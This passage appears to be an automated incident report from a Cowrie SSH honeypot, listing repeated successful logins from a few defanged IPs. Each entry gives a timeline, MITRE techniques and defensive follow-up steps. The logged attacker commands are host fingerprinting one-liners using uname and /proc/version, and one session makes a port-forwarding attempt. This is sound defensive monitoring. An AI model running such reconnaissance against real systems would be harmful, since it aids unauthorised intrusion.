| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:21 |
| **Last Seen** | 2026-09-09 17:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:21:32` | `cowrie.session.connect` |
| `2026-09-09 17:21:34` | `cowrie.client.version` |
| `2026-09-09 17:21:34` | `cowrie.client.kex` |
| `2026-09-09 17:21:40` | `cowrie.login.success` |
| `2026-09-09 17:21:42` | `cowrie.session.params` |
| `2026-09-09 17:21:42` | `cowrie.command.input` |
| `2026-09-09 17:21:42` | `cowrie.log.closed` |
| `2026-09-09 17:21:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f276b901762

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:22 |
| **Last Seen** | 2026-09-09 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:22:47` | `cowrie.session.connect` |
| `2026-09-09 17:22:47` | `cowrie.client.version` |
| `2026-09-09 17:22:47` | `cowrie.client.kex` |
| `2026-09-09 17:22:47` | `cowrie.login.success` |
| `2026-09-09 17:22:48` | `cowrie.session.params` |
| `2026-09-09 17:22:48` | `cowrie.command.input` |
| `2026-09-09 17:22:48` | `cowrie.log.closed` |
| `2026-09-09 17:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d366676a80

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:24 |
| **Last Seen** | 2026-09-09 17:24 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:24:13` | `cowrie.session.connect` |
| `2026-09-09 17:24:14` | `cowrie.client.version` |
| `2026-09-09 17:24:14` | `cowrie.client.kex` |
| `2026-09-09 17:24:18` | `cowrie.login.success` |
| `2026-09-09 17:24:30` | `cowrie.session.params` |
| `2026-09-09 17:24:30` | `cowrie.command.input` |
| `2026-09-09 17:24:32` | `cowrie.log.closed` |
| `2026-09-09 17:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a24b5dda09

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:24 |
| **Last Seen** | 2026-09-09 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:24:24` | `cowrie.session.connect` |
| `2026-09-09 17:24:24` | `cowrie.client.version` |
| `2026-09-09 17:24:24` | `cowrie.client.kex` |
| `2026-09-09 17:24:24` | `cowrie.login.success` |
| `2026-09-09 17:24:25` | `cowrie.session.params` |
| `2026-09-09 17:24:25` | `cowrie.command.input` |
| `2026-09-09 17:24:25` | `cowrie.log.closed` |
| `2026-09-09 17:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb78fae83974

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-09 17:24 |
| **Last Seen** | 2026-09-09 17:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:24:47` | `cowrie.session.connect` |
| `2026-09-09 17:24:47` | `cowrie.client.version` |
| `2026-09-09 17:24:48` | `cowrie.client.kex` |
| `2026-09-09 17:24:48` | `cowrie.login.success` |
| `2026-09-09 17:24:48` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:24:48` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897482c51684

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:26 |
| **Last Seen** | 2026-09-09 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:26:01` | `cowrie.session.connect` |
| `2026-09-09 17:26:01` | `cowrie.client.version` |
| `2026-09-09 17:26:01` | `cowrie.client.kex` |
| `2026-09-09 17:26:02` | `cowrie.login.success` |
| `2026-09-09 17:26:03` | `cowrie.session.params` |
| `2026-09-09 17:26:03` | `cowrie.command.input` |
| `2026-09-09 17:26:03` | `cowrie.log.closed` |
| `2026-09-09 17:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827280e1cf7c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:27 |
| **Last Seen** | 2026-09-09 17:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:27:05` | `cowrie.session.connect` |
| `2026-09-09 17:27:06` | `cowrie.client.version` |
| `2026-09-09 17:27:06` | `cowrie.client.kex` |
| `2026-09-09 17:27:10` | `cowrie.login.success` |
| `2026-09-09 17:27:14` | `cowrie.session.params` |
| `2026-09-09 17:27:14` | `cowrie.command.input` |
| `2026-09-09 17:27:15` | `cowrie.log.closed` |
| `2026-09-09 17:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2908a5e6a36c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:27 |
| **Last Seen** | 2026-09-09 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:27:41` | `cowrie.session.connect` |
| `2026-09-09 17:27:41` | `cowrie.client.version` |
| `2026-09-09 17:27:41` | `cowrie.client.kex` |
| `2026-09-09 17:27:41` | `cowrie.login.success` |
| `2026-09-09 17:27:42` | `cowrie.session.params` |
| `2026-09-09 17:27:42` | `cowrie.command.input` |
| `2026-09-09 17:27:42` | `cowrie.log.closed` |
| `2026-09-09 17:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae1322be416

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:29 |
| **Last Seen** | 2026-09-09 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:29:16` | `cowrie.session.connect` |
| `2026-09-09 17:29:16` | `cowrie.client.version` |
| `2026-09-09 17:29:16` | `cowrie.client.kex` |
| `2026-09-09 17:29:17` | `cowrie.login.success` |
| `2026-09-09 17:29:17` | `cowrie.session.params` |
| `2026-09-09 17:29:17` | `cowrie.command.input` |
| `2026-09-09 17:29:18` | `cowrie.log.closed` |
| `2026-09-09 17:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2174ec72fa61

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:29 |
| **Last Seen** | 2026-09-09 17:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:29:51` | `cowrie.session.connect` |
| `2026-09-09 17:29:52` | `cowrie.client.version` |
| `2026-09-09 17:29:52` | `cowrie.client.kex` |
| `2026-09-09 17:30:00` | `cowrie.login.success` |
| `2026-09-09 17:30:03` | `cowrie.session.params` |
| `2026-09-09 17:30:03` | `cowrie.command.input` |
| `2026-09-09 17:30:03` | `cowrie.log.closed` |
| `2026-09-09 17:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18b382decff

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:30 |
| **Last Seen** | 2026-09-09 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:30:48` | `cowrie.session.connect` |
| `2026-09-09 17:30:48` | `cowrie.client.version` |
| `2026-09-09 17:30:48` | `cowrie.client.kex` |
| `2026-09-09 17:30:48` | `cowrie.login.success` |
| `2026-09-09 17:30:49` | `cowrie.session.params` |
| `2026-09-09 17:30:49` | `cowrie.command.input` |
| `2026-09-09 17:30:49` | `cowrie.log.closed` |
| `2026-09-09 17:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dadacf2d0a51

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:32 |
| **Last Seen** | 2026-09-09 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:32:22` | `cowrie.session.connect` |
| `2026-09-09 17:32:22` | `cowrie.client.version` |
| `2026-09-09 17:32:22` | `cowrie.client.kex` |
| `2026-09-09 17:32:22` | `cowrie.login.success` |
| `2026-09-09 17:32:23` | `cowrie.session.params` |
| `2026-09-09 17:32:23` | `cowrie.command.input` |
| `2026-09-09 17:32:23` | `cowrie.log.closed` |
| `2026-09-09 17:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-845c0a83e397

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:32 |
| **Last Seen** | 2026-09-09 17:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:32:25` | `cowrie.session.connect` |
| `2026-09-09 17:32:26` | `cowrie.client.version` |
| `2026-09-09 17:32:26` | `cowrie.client.kex` |
| `2026-09-09 17:32:30` | `cowrie.login.success` |
| `2026-09-09 17:32:33` | `cowrie.session.params` |
| `2026-09-09 17:32:33` | `cowrie.command.input` |
| `2026-09-09 17:32:33` | `cowrie.log.closed` |
| `2026-09-09 17:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb028b2c8eda

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:34 |
| **Last Seen** | 2026-09-09 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:34:00` | `cowrie.session.connect` |
| `2026-09-09 17:34:00` | `cowrie.client.version` |
| `2026-09-09 17:34:01` | `cowrie.client.kex` |
| `2026-09-09 17:34:01` | `cowrie.login.success` |
| `2026-09-09 17:34:02` | `cowrie.session.params` |
| `2026-09-09 17:34:02` | `cowrie.command.input` |
| `2026-09-09 17:34:02` | `cowrie.log.closed` |
| `2026-09-09 17:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41038ccfcdb2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:34 |
| **Last Seen** | 2026-09-09 17:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:34:59` | `cowrie.session.connect` |
| `2026-09-09 17:35:01` | `cowrie.client.version` |
| `2026-09-09 17:35:01` | `cowrie.client.kex` |
| `2026-09-09 17:35:04` | `cowrie.login.success` |
| `2026-09-09 17:35:07` | `cowrie.session.params` |
| `2026-09-09 17:35:07` | `cowrie.command.input` |
| `2026-09-09 17:35:08` | `cowrie.log.closed` |
| `2026-09-09 17:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1da83a84398

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:35 |
| **Last Seen** | 2026-09-09 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:35:38` | `cowrie.session.connect` |
| `2026-09-09 17:35:38` | `cowrie.client.version` |
| `2026-09-09 17:35:38` | `cowrie.client.kex` |
| `2026-09-09 17:35:38` | `cowrie.login.success` |
| `2026-09-09 17:35:39` | `cowrie.session.params` |
| `2026-09-09 17:35:39` | `cowrie.command.input` |
| `2026-09-09 17:35:39` | `cowrie.log.closed` |
| `2026-09-09 17:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bcdf6e58d7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:37 |
| **Last Seen** | 2026-09-09 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:37:15` | `cowrie.session.connect` |
| `2026-09-09 17:37:15` | `cowrie.client.version` |
| `2026-09-09 17:37:15` | `cowrie.client.kex` |
| `2026-09-09 17:37:15` | `cowrie.login.success` |
| `2026-09-09 17:37:16` | `cowrie.session.params` |
| `2026-09-09 17:37:16` | `cowrie.command.input` |
| `2026-09-09 17:37:16` | `cowrie.log.closed` |
| `2026-09-09 17:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91e6b05784d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:37 |
| **Last Seen** | 2026-09-09 17:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:37:36` | `cowrie.session.connect` |
| `2026-09-09 17:37:38` | `cowrie.client.version` |
| `2026-09-09 17:37:38` | `cowrie.client.kex` |
| `2026-09-09 17:37:44` | `cowrie.login.success` |
| `2026-09-09 17:37:51` | `cowrie.session.params` |
| `2026-09-09 17:37:51` | `cowrie.command.input` |
| `2026-09-09 17:37:54` | `cowrie.log.closed` |
| `2026-09-09 17:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26dec1c5597

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:38 |
| **Last Seen** | 2026-09-09 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:38:54` | `cowrie.session.connect` |
| `2026-09-09 17:38:54` | `cowrie.client.version` |
| `2026-09-09 17:38:54` | `cowrie.client.kex` |
| `2026-09-09 17:38:55` | `cowrie.login.success` |
| `2026-09-09 17:38:56` | `cowrie.session.params` |
| `2026-09-09 17:38:56` | `cowrie.command.input` |
| `2026-09-09 17:38:56` | `cowrie.log.closed` |
| `2026-09-09 17:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9a692c69770

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:40 |
| **Last Seen** | 2026-09-09 17:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:40:11` | `cowrie.session.connect` |
| `2026-09-09 17:40:13` | `cowrie.client.version` |
| `2026-09-09 17:40:13` | `cowrie.client.kex` |
| `2026-09-09 17:40:19` | `cowrie.login.success` |
| `2026-09-09 17:40:22` | `cowrie.session.params` |
| `2026-09-09 17:40:22` | `cowrie.command.input` |
| `2026-09-09 17:40:23` | `cowrie.log.closed` |
| `2026-09-09 17:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0745186b9e67

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:40 |
| **Last Seen** | 2026-09-09 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:40:37` | `cowrie.session.connect` |
| `2026-09-09 17:40:37` | `cowrie.client.version` |
| `2026-09-09 17:40:37` | `cowrie.client.kex` |
| `2026-09-09 17:40:38` | `cowrie.login.success` |
| `2026-09-09 17:40:38` | `cowrie.session.params` |
| `2026-09-09 17:40:38` | `cowrie.command.input` |
| `2026-09-09 17:40:38` | `cowrie.log.closed` |
| `2026-09-09 17:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-388a63023d1c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:42 |
| **Last Seen** | 2026-09-09 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

